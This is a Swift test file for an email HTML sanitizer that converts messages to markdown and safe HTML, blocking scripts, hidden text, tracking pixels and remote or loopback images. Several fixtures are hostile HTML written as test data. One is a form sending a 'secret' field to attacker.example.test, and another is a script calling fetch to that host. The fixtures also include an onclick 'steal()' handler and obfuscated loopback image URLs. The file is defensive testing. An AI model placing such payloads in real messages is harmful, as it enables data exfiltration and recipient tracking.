import Foundation
import Testing
@testable import KanameConnectivity

struct MailHTMLReaderTests {
    @Test
    func readerPreservesUsefulStructureWithoutCSSHiddenContentOrRemoteImages() throws {
        let html = """
        <!doctype html>
        <html>
          <head>
            <style>
              @media screen and (max-width: 600px) { .content { width: 100%; } }
              table { border-collapse: collapse; }
            </style>
            <script>window.bad = true;</script>
          </head>
          <body>
            <div class="preheader">Hidden inbox preview</div>
            <div style="opacity: 0 !important">Invisible fallback text</div>
            <h1>Account update</h1>
            <p>Hello &amp; welcome, <strong>Justin</strong>.</p>
            <ol><li>Review the details</li><li>Confirm the result</li></ol>
            <table><tr><th>Name</th><th>Status</th></tr><tr><td>Transfer</td><td>Complete</td></tr></table>
            <blockquote>Keep this reference.</blockquote>
            <a href="https://example.test/account?id=42">Open account</a>
            <a href="javascript:alert('no')">Unsafe label</a>
            <img src="cid:chart" alt="Account chart">
            <img src="https://images.example.test/hero.png?recipient=unique" width="600" height="240" alt="Hero image">
            <img src="https://tracker.example.test/pixel" width="1" height="1" alt="Tracking pixel">
          </body>
        </html>
        """
        let imageData = try #require(Data(base64Encoded: Self.twoByTwoPNGBase64))
        let reader = try #require(MailHTMLReader.render(
            html,
            embeddedImages: [
                "chart": MailHTMLEmbeddedImage(mimeType: "image/png", data: imageData),
            ]
        ))

        #expect(reader.markdown.contains("# Account update"))
        #expect(reader.markdown.contains("Hello & welcome, **Justin**."))
        #expect(reader.markdown.contains("1. Review the details"))
        #expect(reader.markdown.contains("2. Confirm the result"))
        #expect(reader.markdown.contains("Name  ·  Status"))
        #expect(reader.markdown.contains("> Keep this reference."))
        #expect(reader.markdown.contains("[Open account](<https://example.test/account?id=42>)"))
        #expect(reader.markdown.contains("Unsafe label"))
        #expect(!reader.markdown.contains("javascript:"))
        #expect(reader.markdown.contains("[Image: Account chart]"))
        #expect(!reader.markdown.contains("Tracking pixel"))
        #expect(!reader.markdown.contains("@media"))
        #expect(!reader.markdown.contains("border-collapse"))
        #expect(!reader.markdown.contains("Hidden inbox preview"))
        #expect(!reader.markdown.contains("Invisible fallback text"))
        #expect(!reader.markdown.contains("window.bad"))
        #expect(reader.sourceHTML.contains("@media screen"))
        let sanitizedHTML = try #require(reader.sanitizedHTML)
        #expect(sanitizedHTML.contains("Content-Security-Policy"))
        #expect(sanitizedHTML.contains("<table"))
        #expect(sanitizedHTML.contains("href=\"https://example.test/account?id=42\""))
        #expect(sanitizedHTML.contains("<img"))
        #expect(sanitizedHTML.contains("src=\"data:image/png;base64,"))
        #expect(sanitizedHTML.contains("[Image: Hero image]"))
        #expect(sanitizedHTML.contains("img-src data:"))
        #expect(!sanitizedHTML.contains("images.example.test"))
        #expect(!sanitizedHTML.contains("tracker.example.test"))
        #expect(!sanitizedHTML.contains("cid:chart"))
        #expect(!sanitizedHTML.contains("javascript:"))
        #expect(!sanitizedHTML.contains("window.bad"))
        #expect(reader.embeddedImageCount == 1)
        #expect(reader.remoteImageCount == 1)
        #expect(reader.insecureRemoteImageCount == 0)

        let directHTML = try #require(reader.directRemoteImagesHTML)
        #expect(directHTML.contains("src=\"data:image/png;base64,"))
        #expect(directHTML.contains("https://images.example.test/hero.png?recipient=unique"))
        #expect(directHTML.contains("img-src data: https:"))
        #expect(directHTML.contains("referrerpolicy=\"no-referrer\""))
        #expect(!directHTML.contains("tracker.example.test"))
        let attributed = try AttributedString(
            markdown: reader.markdown,
            options: AttributedString.MarkdownParsingOptions(interpretedSyntax: .full)
        )
        #expect(String(attributed.characters).contains("Open account"))
    }

    @Test
    func malformedHTMLStillProducesReadableEntityDecodedText() throws {
        let reader = try #require(MailHTMLReader.render(
            "<main><h2>Results &amp; next steps</h2><p>First item<div>Second item"
        ))

        #expect(reader.plainText.contains("Results & next steps"))
        #expect(reader.plainText.contains("First item"))
        #expect(reader.plainText.contains("Second item"))
        #expect(!reader.plainText.contains("<main>"))
    }

    @Test
    func oversizedHTMLIsBoundedAndDisclosesTruncation() throws {
        let html = "<p>Visible start "
            + String(repeating: "x", count: MailHTMLReader.maximumInputBytes)
            + "</p>"
        let reader = try #require(MailHTMLReader.render(html))

        #expect(reader.sourceWasTruncated)
        #expect(reader.sourceHTML.utf8.count <= MailHTMLReader.maximumInputBytes)
        #expect(reader.markdown.contains("Message content was truncated for safe display."))
        #expect(reader.plainText.contains("Visible start"))
    }

    @Test
    func fontSizeZeroLayoutContainerKeepsVisibleDescendants() throws {
        let html = """
        <table role="presentation" width="100%">
          <tr>
            <td style="font-size: 0; text-align: center; background-color: #f4f7f9">
              <div style="display: inline-block; font-size: 16px; line-height: 24px">
                <h1>How did we do?</h1>
                <p>Tell us about your transfer.</p>
                <a href="https://wise.example.test/feedback">Share feedback</a>
              </div>
            </td>
          </tr>
        </table>
        """

        let reader = try #require(MailHTMLReader.render(html))
        let sanitizedHTML = try #require(reader.sanitizedHTML)

        #expect(reader.plainText.contains("How did we do?"))
        #expect(reader.plainText.contains("Tell us about your transfer."))
        #expect(reader.markdown.contains("[Share feedback](<https://wise.example.test/feedback>)"))
        #expect(sanitizedHTML.contains("<table"))
        #expect(sanitizedHTML.contains("font-size:0"))
        #expect(sanitizedHTML.contains("font-size:16px"))
        #expect(sanitizedHTML.contains("How did we do?"))
    }

    @Test
    func tableHeavyDigestKeepsLayoutWhileRemovingActiveAndRemoteContent() throws {
        let html = """
        <main>
          <table width="640" cellpadding="0" cellspacing="0" style="border-collapse: collapse; background: url(https://tracker.example.test/background)">
            <tr><td style="padding: 24px"><h2>Your Cinode digest</h2></td></tr>
            <tr>
              <td>
                <table width="100%" style="background-color: #ffffff">
                  <tr>
                    <td width="50%" style="padding: 12px"><strong>New assignment</strong></td>
                    <td width="50%" style="padding: 12px"><a href="https://cinode.example.test/assignment" onclick="steal()">Review</a></td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
          <form action="https://attacker.example.test"><input name="secret"></form>
          <img src="https://tracker.example.test/open" alt="Team chart">
          <script>fetch('https://attacker.example.test')</script>
        </main>
        """

        let reader = try #require(MailHTMLReader.render(html))
        let sanitizedHTML = try #require(reader.sanitizedHTML)

        #expect(sanitizedHTML.components(separatedBy: "<table").count == 3)
        #expect(sanitizedHTML.contains("border-collapse:collapse"))
        #expect(sanitizedHTML.contains("background-color:#ffffff"))
        #expect(sanitizedHTML.contains("href=\"https://cinode.example.test/assignment\""))
        #expect(sanitizedHTML.contains("[Image: Team chart]"))
        #expect(!sanitizedHTML.contains("url("))
        #expect(!sanitizedHTML.contains("onclick"))
        #expect(!sanitizedHTML.contains("<form"))
        #expect(!sanitizedHTML.contains("<input"))
        #expect(!sanitizedHTML.contains("<script"))
        #expect(!sanitizedHTML.contains("tracker.example.test"))
        #expect(!sanitizedHTML.contains("attacker.example.test"))
    }

    @Test
    func publicHTTPImagesUpgradeToHTTPSWhileUnsafeAndUnvalidatedImagesStayBlocked() throws {
        let html = """
        <p>Safe text</p>
        <img src="http://images.example.test/plain.png?recipient=unique" alt="Insecure image">
        <img src="https://localhost/internal.png" alt="Local image">
        <img src="https://localhost./internal.png" alt="Local FQDN image">
        <img src="http://2130706433/decimal-loopback.png" alt="Decimal IP image">
        <img src="http://0x7f000001/hex-loopback.png" alt="Hex IP image">
        <img src="http://127.1/short-loopback.png" alt="Short IP image">
        <img src="http://[::1]/ipv6-loopback.png" alt="IPv6 image">
        <img src="http://images.example.test:8080/custom-port.png" alt="Custom port image">
        <img src="cid:vector" alt="Vector image">
        """
        let vector = Data("<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>".utf8)
        let reader = try #require(MailHTMLReader.render(
            html,
            embeddedImages: [
                "vector": MailHTMLEmbeddedImage(mimeType: "image/svg+xml", data: vector),
            ]
        ))
        let sanitizedHTML = try #require(reader.sanitizedHTML)

        #expect(reader.remoteImageCount == 1)
        #expect(reader.insecureRemoteImageCount == 1)
        #expect(reader.embeddedImageCount == 0)
        #expect(!sanitizedHTML.contains("<img"))
        #expect(sanitizedHTML.contains("[Image: Insecure image]"))
        #expect(sanitizedHTML.contains("[Image: Local image]"))
        #expect(sanitizedHTML.contains("[Image: Local FQDN image]"))
        #expect(sanitizedHTML.contains("[Image: Decimal IP image]"))
        #expect(sanitizedHTML.contains("[Image: Hex IP image]"))
        #expect(sanitizedHTML.contains("[Image: Short IP image]"))
        #expect(sanitizedHTML.contains("[Image: IPv6 image]"))
        #expect(sanitizedHTML.contains("[Image: Custom port image]"))
        #expect(sanitizedHTML.contains("[Image: Vector image]"))
        #expect(!sanitizedHTML.contains("localhost"))
        #expect(!sanitizedHTML.contains("image/svg+xml"))

        let directHTML = try #require(reader.directRemoteImagesHTML)
        #expect(directHTML.contains("https://images.example.test/plain.png?recipient=unique"))
        #expect(!directHTML.contains("http://"))
        #expect(!directHTML.contains("localhost"))
        #expect(!directHTML.contains("2130706433"))
        #expect(!directHTML.contains("0x7f000001"))
        #expect(!directHTML.contains("127.1"))
        #expect(!directHTML.contains("::1"))
        #expect(!directHTML.contains(":8080"))
        #expect(directHTML.contains("[Image: Custom port image]"))
    }

    private static let twoByTwoPNGBase64 =
        "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAD0lEQVR4nGP4z8DAwMAAAAYIAQHLR3Z1AAAAAElFTkSuQmCC"
}
